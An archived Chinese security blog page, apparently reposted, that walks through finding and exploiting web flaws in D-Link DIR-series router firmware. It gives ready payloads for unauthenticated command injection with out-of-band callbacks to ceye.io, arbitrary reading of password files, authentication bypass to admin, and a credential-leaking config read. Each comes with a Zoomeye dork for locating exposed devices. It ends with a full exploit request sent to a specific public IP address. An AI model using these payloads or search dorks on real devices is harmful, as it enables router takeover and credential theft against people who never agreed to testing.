@@ -1,0 +1,702 @@
+<!doctype html>
+<html class="theme-next use-motion theme-next-mist">
+<head>
+  
+
+<meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+  <link rel="stylesheet" type="text/css" href="/vendors/fancybox/source/jquery.fancybox.css?v=2.1.5"/>
+
+
+<link rel="stylesheet" type="text/css" href="/css/main.css?v=0.4.3"/>
+
+
+    <meta name="description" content="关于计算机科学的学习经历与精彩文章分享。" />
+
+
+
+  <meta name="keywords" content="渗透测试,IoT," />
+
+
+
+
+
+  <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.3" />
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var CONFIG = {
+    scheme: 'Mist',
+    analytics: {
+      google: ''
+    },
+    sidebar: 'post'
+  };
+</script>
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?351a523b2429a0dda1b90bb708a00fad";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+  <title> D-Link系列路由器漏洞挖掘入门 // Neurohazard </title>
+</head>
+
+<body>
+  <!--[if lte IE 8]>
+  <div style=' clear: both; height: 59px; padding:0 0 0 15px; position: relative;margin:0 auto;'>
+    <a href="http://windows.microsoft.com/en-US/internet-explorer/products/ie/home?ocid=ie6_countdown_bannercode">
+      <img src="http://7u2nvr.com1.z0.glb.clouddn.com/picouterie.jpg" border="0" height="42" width="820"
+           alt="You are using an outdated browser. For a faster, safer browsing experience, upgrade for free today or use other browser ,like chrome firefox safari."
+           style='margin-left:auto;margin-right:auto;display: block;'/>
+    </a>
+  </div>
+<![endif]-->
+
+  <div class="container one-column page-post-detail">
+    <div class="headband"></div>
+
+    <div id="header" class="header">
+      <div class="header-inner">
+        <h1 class="site-meta">
+  <span class="logo-line-before"><i></i></span>
+  <a href="/" class="brand">
+      <span class="logo">
+        <i class="icon-logo"></i>
+      </span>
+      <span class="site-title">Neurohazard</span>
+  </a>
+  <span class="logo-line-after"><i></i></span>
+</h1>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<div class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu ">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/">
+            <i class="menu-item-icon icon-home"></i> <br />
+            首頁
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            <i class="menu-item-icon icon-about"></i> <br />
+            關於
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            <i class="menu-item-icon icon-archives"></i> <br />
+            歸檔
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            <i class="menu-item-icon icon-tags"></i> <br />
+            標籤
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-friend">
+          <a href="/friend">
+            <i class="menu-item-icon icon-friend"></i> <br />
+            友情鏈接
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-reading-list">
+          <a href="/reading-list">
+            <i class="menu-item-icon icon-reading-list"></i> <br />
+            閱讀清單
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+</div>
+
+
+      </div>
+    </div>
+
+    <div id="main" class="main">
+      <div class="main-inner">
+        <div id="content" class="content">
+          
+
+  <div id="posts" class="posts-expand">
+    
+
+  <div class="post post-type-normal ">
+    <div class="post-header">
+
+      
+      
+        <h1 class="post-title">
+          
+          
+            
+              D-Link系列路由器漏洞挖掘入门
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          發表於 2017-11-09
+        </span>
+
+        
+          <span class="post-category">
+            &nbsp; | &nbsp; 分類於
+            
+              <a href="/categories/信息安全/">信息安全</a>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+            &nbsp; | &nbsp;
+            <a href="/2017/11/09/dlink-router-vulnerabilities/#comments" >
+              <span class="post-comments-count ds-thread-count" data-thread-key="2017/11/09/dlink-router-vulnerabilities/"></span>
+            </a>
+          </span>
+          
+        
+      </div>
+    </div>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        <h1 id="原文"><a href="#原文" class="headerlink" title="原文"></a>原文</h1><p><a href="http://www.freebuf.com/articles/terminal/153176.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/153176.html</a><br><a href="https://paper.seebug.org/429/" target="_blank" rel="external">https://paper.seebug.org/429/</a></p>
+<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>前几天去上海参加了geekpwn，看着大神们一个个破解成功各种硬件，我只能在下面喊 6666，特别羡慕那些大神们。所以回来就决定好好研究一下路由器，争取跟上大神们的步伐。看网上公开的 D-Link 系列的漏洞也不少，那就从D-Link路由器漏洞开始学习。</p>
+<h1 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h1><p>既然要挖路由器漏洞，首先要搞到路由器的固件。 D-Link路由器固件下载地址：<br>ftp://ftp2.dlink.com/PRODUCTS/</p>
+<p>下载完固件发现是个压缩包，解压之后里面还是有一个bin文件。听说用binwalk就可以解压。kali-linux自带binwalk，但是缺少一些依赖，所以还是编译安装了一下。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get update  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install build-essential autoconf git</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> https://github.com/devttys0/binwalk/blob/master/INSTALL.md  </span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/devttys0/binwalk.git  </span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> binwalk</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> python2.7安装  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo python setup.py install</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> python2.7手动安装依赖库  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python-lzma</span></div><div class="line"></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python-crypto</span></div><div class="line"></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo pip install pyqtgraph</span></div><div class="line"></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install python-pip  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo pip install capstone</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> Install standard extraction utilities（必选）  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsprogs cramfsswap squashfs-tools</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> Install sasquatch to extract non-standard SquashFS images（必选）  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zlib1g-dev liblzma-dev liblzo2-dev  </span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/devttys0/sasquatch  </span></div><div class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">cd</span> sasquatch &amp;&amp; ./build.sh)</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> Install jefferson to extract JFFS2 file systems（可选）  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo pip install cstruct  </span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/sviehb/jefferson  </span></div><div class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">cd</span> jefferson &amp;&amp; sudo python setup.py install)</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> Install ubi_reader to extract UBIFS file systems（可选）  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install liblzo2-dev python-lzo  </span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/jrspruitt/ubi_reader  </span></div><div class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">cd</span> ubi_reader &amp;&amp; sudo python setup.py install)</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> Install yaffshiv to extract YAFFS file systems（可选）  </span></div><div class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/devttys0/yaffshiv  </span></div><div class="line"><span class="meta">$</span><span class="bash"> (<span class="built_in">cd</span> yaffshiv &amp;&amp; sudo python setup.py install)</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> Install unstuff (closed <span class="built_in">source</span>) to extract StuffIt archive files（可选）  </span></div><div class="line"><span class="meta">$</span><span class="bash"> wget -O - http://my.smithmicro.com/downloads/files/stuffit520.611linux-i386.tar.gz | tar -zxv  </span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo cp bin/unstuff /usr/<span class="built_in">local</span>/bin/</span></div></pre></td></tr></table></figure></p>
+<p>按照上面的命令就可以完整的安装binwalk了，这样就可以解开市面上的大部分固件包。 然后用<code>binwalk -Me 固件包名称</code>解固件，然后我们会得到以下划线开头的名称的文件夹，文件夹里squashfs-root文件夹，就是路由器的完整固件包。</p>
+<h1 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h1><p>此文章针对历史路由器的web漏洞进行分析，路由器的web文件夹 一般就在suashfs-root/www或者 suashfs-root/htdocs文件夹里。路由器固件所使用的语言一般为 asp,php,cgi,lua 等语言。这里主要进行php的代码审计来挖掘漏洞。</p>
+<h2 id="D-Link-DIR-645-amp-DIR-815-命令执行漏洞"><a href="#D-Link-DIR-645-amp-DIR-815-命令执行漏洞" class="headerlink" title="D-Link DIR-645 &amp; DIR-815 命令执行漏洞"></a>D-Link DIR-645 &amp; DIR-815 命令执行漏洞</h2><p>Zoomeye dork: DIR-815 or DIR-645</p>
+<p>这里以 D-Link DIR-645固件为例，解开固件进入 suashfs-root/htdocs 文件夹。<br>这个漏洞出现在<code>diagnostic.php</code>文件。直接看代码<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 <span class="number">200</span> OK</div><div class="line"><span class="attribute">Content-Type</span>: text/xml</div><div class="line"></div><div class="line">&lt;?</div><div class="line">if ($_POST["act"] == "ping")</div><div class="line">&#123;</div><div class="line">    set("/runtime/diagnostic/ping", $_POST["dst"]);</div><div class="line">    $result = "OK";</div><div class="line">&#125;</div><div class="line">else if ($_POST["act"] == "pingreport")</div><div class="line">&#123;</div><div class="line">    $result = get("x", "/runtime/diagnostic/ping");</div><div class="line">&#125;</div><div class="line">echo '&lt;?xml version="1.0"?&gt;\n';</div><div class="line">?&gt;&lt;diagnostic&gt;</div><div class="line">    &lt;report&gt;&lt;?=$result?&gt;&lt;/report&gt;</div><div class="line">&lt;/diagnostic&gt;</div></pre></td></tr></table></figure></p>
+<p>分析代码可以看到，这里没有进行权限认证，所以可以直接绕过登录。继续往下看，<code>set(&quot;/runtime/diagnostic/ping&quot;, $_POST[&quot;dst&quot;]);</code> 这段代码就是造成漏洞的关键代码。参数dst 没有任何过滤直接进入到了 ping的命令执行里，导致任意命令执行漏洞。继续往下看 <code>$result = &quot;OK&quot;;</code> 无论是否执行成功，这里都会显示OK。所以这是一个盲注的命令执行。以此构造payload。</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="attr">url</span> = <span class="string">'localhost/diagnostic.php'</span></div><div class="line"><span class="attr">data</span> = <span class="string">"act=ping&amp;dst=%26 ping `whoami`.ceye.io%26"</span></div></pre></td></tr></table></figure>
+<p>因为是盲注的命令执行，所以这里需要借助一个盲打平台（如：ceye），来验证漏洞是否存在。</p>
+<p><strong>补充</strong><br>这里用<code>act=pingreport</code>可能就有回显了，需要有设备环境调试一下。</p>
+<h2 id="D-Link-DIR-300-amp-DIR-320-amp-DIR-600-amp-DIR-615-任意文件读取-信息泄露-漏洞"><a href="#D-Link-DIR-300-amp-DIR-320-amp-DIR-600-amp-DIR-615-任意文件读取-信息泄露-漏洞" class="headerlink" title="D-Link DIR-300 &amp; DIR-320 &amp; DIR-600 &amp; DIR-615 任意文件读取(信息泄露)漏洞"></a>D-Link DIR-300 &amp; DIR-320 &amp; DIR-600 &amp; DIR-615 任意文件读取(信息泄露)漏洞</h2><p>Zoomeye dork:DIR-300 or DIR-600</p>
+<p>这里以 D-Link DIR-300固件为例，解开固件进入 <code>suashfs-root/www</code> 文件夹。<br>漏洞出现在<code>/model/__show_info.php文件</code>。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span></span></div><div class="line"><span class="php"><span class="keyword">if</span>($REQUIRE_FILE == <span class="string">"var/etc/httpasswd"</span> || $REQUIRE_FILE == <span class="string">"var/etc/hnapasswd"</span>)</span></div><div class="line"><span class="php">&#123;</span></div><div class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;title&gt;404 Not Found&lt;/title&gt;\n"</span>;</span></div><div class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">"&lt;h1&gt;404 Not Found&lt;/h1&gt;\n"</span>;</span></div><div class="line"><span class="php">&#125;</span></div><div class="line"><span class="php"><span class="keyword">else</span></span></div><div class="line"><span class="php">&#123;</span></div><div class="line"><span class="php">    <span class="keyword">if</span>($REQUIRE_FILE!=<span class="string">""</span>)</span></div><div class="line"><span class="php">    &#123;</span></div><div class="line"><span class="php">        <span class="keyword">require</span>($LOCALE_PATH.<span class="string">"/"</span>.$REQUIRE_FILE);</span></div><div class="line"><span class="php">    &#125;</span></div><div class="line"><span class="php">    <span class="keyword">else</span></span></div><div class="line"><span class="php">    &#123;</span></div><div class="line"><span class="php">        <span class="keyword">echo</span> $m_context;</span></div><div class="line"><span class="php">        <span class="keyword">echo</span> $m_context2;<span class="comment">//jana added</span></span></div><div class="line"><span class="php">        <span class="keyword">if</span>($m_context_next!=<span class="string">""</span>)</span></div><div class="line"><span class="php">        &#123;</span></div><div class="line"><span class="php">            <span class="keyword">echo</span> $m_context_next;</span></div><div class="line"><span class="php">        &#125;</span></div><div class="line"><span class="php">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span></div><div class="line"><span class="php">        <span class="keyword">if</span>($USE_BUTTON==<span class="string">"1"</span>)</span></div><div class="line"><span class="php">        &#123;<span class="keyword">echo</span> <span class="string">"&lt;input type=button name='bt' value='"</span>.$m_button_dsc.<span class="string">"' onclick='click_bt();'&gt;\n"</span>; &#125;</span></div><div class="line"><span class="php">    &#125;</span></div><div class="line"><span class="php">&#125;</span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure>
+<p>这里看到已经禁止了<code>$REQUIRE_FILE</code>的参数为<code>var/etc/httpasswd</code>和<code>var/etc/hnapasswd</code>。<br>这么一看无法获取账号密码。但是我们可以从根路径开始配置httpasswd的路径，就可以绕过这个过滤了。</p>
+<p>payload<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">localhost<span class="regexp">/model/</span>__show_info.php?REQUIRE_FILE=<span class="regexp">/var/</span>etc<span class="regexp">/httpasswd</span></div></pre></td></tr></table></figure></p>
+<p>这里设置<code>REQUIRE_FILE=/var/etc/httpasswd</code>成功绕过上面的if判断，进行任意文件读取。</p>
+<h2 id="D-Link-DIR-300-amp-DIR-320-amp-DIR-615-权限绕过漏洞"><a href="#D-Link-DIR-300-amp-DIR-320-amp-DIR-615-权限绕过漏洞" class="headerlink" title="D-Link DIR-300 &amp; DIR-320 &amp; DIR-615 权限绕过漏洞"></a>D-Link DIR-300 &amp; DIR-320 &amp; DIR-615 权限绕过漏洞</h2><p>Zoomeye dork:DIR-300 or DIR-615</p>
+<p>这里以 D-Link DIR-300固件为例，解开固件进入 <code>suashfs-root/www</code> 文件夹</p>
+<p>默认情况下，Web界面中的所有页面都需要进行身份验证，但是某些页面（如 登录页面） 必须在认证之前访问。 为了让这些页面不进行认证，他们设置了一个PHP变量NO_NEED_AUTH：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span></span></div><div class="line"><span class="php">$MY_NAME =<span class="string">"login_fail"</span>;</span></div><div class="line"><span class="php">$MY_MSG_FILE=$MY_NAME.<span class="string">".php"</span>;</span></div><div class="line"><span class="php">$NO_NEED_AUTH=<span class="string">"1"</span>;</span></div><div class="line"><span class="php">$NO_SESSION_TIMEOUT=<span class="string">"1"</span>;</span></div><div class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"/www/model/__html_head.php"</span>);</span></div><div class="line"><span class="php"><span class="meta">?&gt;</span></span></div></pre></td></tr></table></figure>
+<p>此漏洞触发的原因在于 全局文件 <code>_html_head.php</code>。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?</div><div class="line"><span class="regexp">/* vi: set sw=4 ts=4: */</span></div><div class="line"><span class="keyword">if</span> (<span class="variable">$NO_NEED_AUTH</span>!=<span class="string">"1"</span>)</div><div class="line">&#123;</div><div class="line"></div><div class="line"><span class="regexp">/* for POP up login. */</span></div><div class="line"><span class="regexp">//</span> require(<span class="string">"/www/auth/__authenticate_p.php"</span>);</div><div class="line"><span class="regexp">//</span> <span class="keyword">if</span> (<span class="variable">$AUTH_RESULT</span>==<span class="string">"401"</span>) &#123;<span class="keyword">exit</span>;&#125;</div><div class="line"></div><div class="line"><span class="regexp">/* for WEB based login */</span></div><div class="line"> require(<span class="string">"/www/auth/__authenticate_s.php"</span>);</div><div class="line"> <span class="keyword">if</span>(<span class="variable">$AUTH_RESULT</span>==<span class="string">"401"</span>) &#123;require(<span class="string">"/www/login.php"</span>); <span class="keyword">exit</span>;&#125;</div><div class="line"> <span class="keyword">if</span>(<span class="variable">$AUTH_RESULT</span>==<span class="string">"full"</span>) &#123;require(<span class="string">"/www/session_full.php"</span>); <span class="keyword">exit</span>;&#125;</div><div class="line"> <span class="keyword">if</span>(<span class="variable">$AUTH_RESULT</span>==<span class="string">"timeout"</span>) &#123;require(<span class="string">"/www/session_timeout.php"</span>); <span class="keyword">exit</span>;&#125;</div><div class="line"> <span class="variable">$AUTH_GROUP</span>=fread(<span class="string">"/var/proc/web/session:"</span>.<span class="variable">$sid</span>.<span class="string">"/user/group"</span>);</div><div class="line">&#125;</div><div class="line">require(<span class="string">"/www/model/__lang_msg.php"</span>);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>这里我们看到 <code>$NO_NEED_AUTH!=&quot;1&quot;</code> 如果 <code>$NO_NEED_AUTH</code> 不为 1 则进入身份认证。如果我们把<code>$NO_NEED_AUTH</code> 值设置为 1 那就绕过了认证进行任意操作。</p>
+<p>payload<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">localhost/bsc_lan.php?NO_NEED_AUTH=<span class="number">1</span>&amp;AUTH_GROUP=<span class="number">0</span></div></pre></td></tr></table></figure></p>
+<p>这里<code>AUTH_GROUP=0</code> 表示admin权限</p>
+<h2 id="D-Link-DIR-645-信息泄露漏洞"><a href="#D-Link-DIR-645-信息泄露漏洞" class="headerlink" title="D-Link DIR-645 信息泄露漏洞"></a>D-Link DIR-645 信息泄露漏洞</h2><p>Zoomeye dork:DIR-645</p>
+<p>D-Link DIR-645 getcfg.php 文件由于过滤不严格导致信息泄露漏洞。<br><figure class="highlight gams"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta"><span class="meta-keyword">$SERVICE</span>_COUNT = cut_count($_POST["SERVICES"], ",");</span></div><div class="line">TRACE_debug(<span class="string">"GETCFG: got "</span>.<span class="symbol">$</span>SERVICE_COUNT.<span class="string">" service(s): "</span>.<span class="symbol">$</span>_POST[<span class="string">"SERVICES"</span>]);</div><div class="line"><span class="meta"><span class="meta-keyword">$SERVICE</span>_INDEX = 0;</span></div><div class="line"><span class="keyword">while</span> (<span class="symbol">$</span>SERVICE_INDEX &lt; <span class="symbol">$</span>SERVICE_COUNT)</div><div class="line">&#123;</div><div class="line">    <span class="symbol">$</span>GETCFG_SVC = cut(<span class="symbol">$</span>_POST[<span class="string">"SERVICES"</span>], <span class="symbol">$</span>SERVICE_INDEX, <span class="string">","</span>);</div><div class="line">    TRACE_debug(<span class="string">"GETCFG: serivce["</span>.<span class="symbol">$</span>SERVICE_INDEX.<span class="string">"] = "</span>.<span class="symbol">$</span>GETCFG_SVC);</div><div class="line">    <span class="keyword">if</span> (<span class="symbol">$</span>GETCFG_SVC!=<span class="string">""</span>)</div><div class="line">    &#123;</div><div class="line">        <span class="symbol">$</span><span class="keyword">file</span> = <span class="string">"/htdocs/webinc/getcfg/"</span>.<span class="symbol">$</span>GETCFG_SVC.<span class="string">".xml.php"</span>;</div><div class="line">        <span class="comment">/* GETCFG_SVC will be passed to the child process. */</span></div><div class="line">        <span class="keyword">if</span> (isfile(<span class="symbol">$</span><span class="keyword">file</span>)==<span class="string">"1"</span>) dophp(<span class="string">"load"</span>, <span class="symbol">$</span><span class="keyword">file</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="symbol">$</span>SERVICE_INDEX++;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>这里我们可以看到 <code>$GETCFG_SVC</code> 没有任何过滤直接获取了 POST 传递过来的SERVICES的值。如果 <code>$GETCFG_SVC</code> 不为空，则进行文件读取。这里我们就可以读取存储此设备信息的 <code>DEVICE.ACCOUNT.xml.php</code> 文件。</p>
+<p>payload：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span><span class="comment">//localhost/getcfg.php</span></div><div class="line"><span class="symbol">post:</span>SERVICES=DEVICE.ACCOUNT</div></pre></td></tr></table></figure></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>可以发现此篇文章所提及的漏洞都是web领域的常见漏洞，如权限绕过，信息泄露，命令执行等漏洞。由于路由器的安全没有得到足够的重视，此文涉及到的漏洞都是因为对参数过滤不严格所导致的。 路由器的漏洞影响还是很广泛的，在此提醒用户，及时更新路由器固件，以此避免各种入侵事件，以及个人信息的泄露。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p><a href="http://www.s3cur1ty.de/m1adv2013-017" target="_blank" rel="external">http://www.s3cur1ty.de/m1adv2013-017</a><br><a href="http://seclists.org/bugtraq/2013/Dec/11" target="_blank" rel="external">http://seclists.org/bugtraq/2013/Dec/11</a><br><a href="http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf" target="_blank" rel="external">http://www.devttys0.com/wp-content/uploads/2010/12/dlink_php_vulnerability.pdf</a><br><a href="https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt" target="_blank" rel="external">https://packetstormsecurity.com/files/120591/dlinkdir645-bypass.txt</a></p>
+<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>Hardware Version : A1<br>Firmware Version : 1.01<br>测试结果: 可利用</p>
+<p>Hardware Version : A1<br>Firmware Version : 1.04<br>测试结果：不可利用</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">D-Link DIR<span class="number">-645</span> diagnostic RCE</div><div class="line">POST <span class="regexp">/diagnostic.php HTTP/</span><span class="number">1.1</span></div><div class="line"><span class="string">Host:</span> <span class="number">46.183</span><span class="number">.169</span><span class="number">.127</span>:<span class="number">8080</span></div><div class="line">User-<span class="string">Agent:</span> Mozilla<span class="regexp">/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/</span><span class="number">20100101</span> Firefox/<span class="number">56.0</span></div><div class="line"><span class="string">Accept:</span> text<span class="regexp">/html,application/</span>xhtml+xml,application<span class="regexp">/xml;q=0.9,*/</span>*;q=<span class="number">0.8</span></div><div class="line">Accept-<span class="string">Language:</span> zh-CN,zh;q=<span class="number">0.8</span>,en-US;q=<span class="number">0.5</span>,en;q=<span class="number">0.3</span></div><div class="line">Content-<span class="string">Type:</span> application/x-www-form-urlencoded</div><div class="line">Content-<span class="string">Length:</span> <span class="number">60</span></div><div class="line"><span class="string">DNT:</span> <span class="number">1</span></div><div class="line"><span class="string">Connection:</span> close</div><div class="line">Upgrade-Insecure-<span class="string">Requests:</span> <span class="number">1</span></div><div class="line"></div><div class="line">act=ping&amp;dst=%<span class="number">26</span>%<span class="number">20</span>wget%<span class="number">20</span><span class="string">http:</span><span class="comment">//dlinkwget.xxxxx.ceye.io%26</span></div></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    <div class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/"> #渗透测试 </a>
+          
+            <a href="/tags/IoT/"> #IoT </a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/09/ctf-wiki/">ctf wiki</a>
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/09/php-properties-that-easily-cause-vulnerability/">PHP代码审计中的常见套路 检查相等时的漏洞</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </div>
+  </div>
+
+
+
+    
+      <div class="post-spread">
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      </div>
+    
+
+    
+      <div class="comments" id="comments">
+        
+          <div class="ds-thread" data-thread-key="2017/11/09/dlink-router-vulnerabilities/"
